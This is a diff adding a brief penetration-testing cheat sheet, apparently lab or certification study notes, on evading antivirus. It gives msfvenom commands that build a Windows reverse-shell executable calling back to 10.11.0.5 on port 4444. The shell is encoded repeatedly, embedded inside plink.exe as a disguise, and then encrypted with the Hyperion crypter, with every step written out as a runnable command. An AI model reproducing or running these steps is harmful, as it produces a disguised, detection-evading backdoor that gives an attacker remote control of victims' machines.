@@ -1,0 +1,15 @@
+## Encoding
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+
+## Embeding 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+
+## Crypting
+root@kali:~# cp shell_reverse_msf_encoded_embedded.exe backdoor.exe
+root@kali:~# cp /usr/share/windows-binaries/Hyperion-1.0.zip .
+root@kali:~# unzip Hyperion-1.0.zip
+root@kali:~# cd Hyperion-1.0/
+root@kali:~/Hyperion-1.0# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
+root@kali:~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libgcc_s_sjlj-1.dll .
+root@kali:~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .
+root@kali:~/Hyperion-1.0# wine hyperion.exe ../backdoor.exe ../crypted.exe
